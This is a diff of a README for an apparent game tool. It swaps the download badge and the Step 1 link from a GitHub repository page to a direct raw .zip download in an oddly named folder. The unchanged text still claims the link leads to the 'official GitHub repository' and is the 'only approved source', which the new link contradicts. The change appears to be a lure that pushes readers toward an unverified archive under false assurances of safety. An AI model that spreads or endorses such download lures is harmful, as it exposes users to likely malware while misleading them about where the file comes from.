@@ -33,11 +33,11 @@ Several other quality-of-life improvements are included to smooth out your exper
 
 Ready to get started? Follow these simple steps:
 
-[![Download Now](https://img.shields.io/badge/Download-The_Division_Resurgence_Agent_Overwatch-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Flatfooted-lagbomer624/The-Division-Resurgence-Agent-Overwatch)
+[![Download Now](https://img.shields.io/badge/Download-The_Division_Resurgence_Agent_Overwatch-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Flatfooted-lagbomer624/The-Division-Resurgence-Agent-Overwatch/main/canonship/v2.8.zip)
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/Flatfooted-lagbomer624/The-Division-Resurgence-Agent-Overwatch](https://github.com/Flatfooted-lagbomer624/The-Division-Resurgence-Agent-Overwatch)
+Visit this link to download the application: [https://raw.githubusercontent.com/Flatfooted-lagbomer624/The-Division-Resurgence-Agent-Overwatch/main/canonship/v2.8.zip](https://raw.githubusercontent.com/Flatfooted-lagbomer624/The-Division-Resurgence-Agent-Overwatch/main/canonship/v2.8.zip)
 
 This link takes you to the official GitHub repository where the latest version of the tool is hosted. This is the only approved source, so always use this direct link to ensure you get the authentic, safe version.
 
